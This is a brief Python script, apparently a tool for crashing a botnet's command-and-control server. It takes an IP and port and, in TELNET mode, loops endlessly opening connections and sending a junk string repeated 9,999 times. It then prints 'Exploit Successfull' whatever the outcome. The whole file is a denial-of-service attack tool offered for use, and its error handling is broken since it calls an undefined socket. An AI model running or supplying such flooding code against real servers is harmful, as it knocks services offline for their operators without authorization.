import telnetlib
import socket
import time
import sys
import threading

if len(sys.argv) < 3:
    sys.exit(f"Usage: [RAW/TELNET] [IP] [CNC-PORT]")
ctype = str(sys.argv[1])
ip = str(sys.argv[2])
cnc_port = int(sys.argv[3])
string = "!@#*#(@)@!_@)#"*9999
timeout = 20
if sys.argv[1] == 'RAW':
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, cnc_port))
        print(f"\x1b[92mConnection Successfull! \x1b[97m|\x1b[91m Starting Exploit")
    except:
        print(f"\x1b[92mConnection Failed! \x1b[97m|\x1b[91m Please Try Again")
        pass
if sys.argv[1] == 'TELNET':
    try:
         while True:
            with telnetlib.Telnet(ip, cnc_port, timeout) as connection:
                print(f"\x1b[92mConnection Successfull! \x1b[97m|\x1b[91m STRING \x1b[97m{string}")
                connection.write("{}".format(string).encode('ascii'))
            continue
    except Exception:
        try:
            testing = sock.connect_ex((ip, cnc_port))
            if testing == 0:
                print(f"\x1b[92mConnection Successfull! \x1b[97m| \x1b[91m Net Online")
            else:
                print(f"\x1b[92mConnection Successfull! \x1b[97m| \x1b[91mExploit Successfull")
        except:
            pass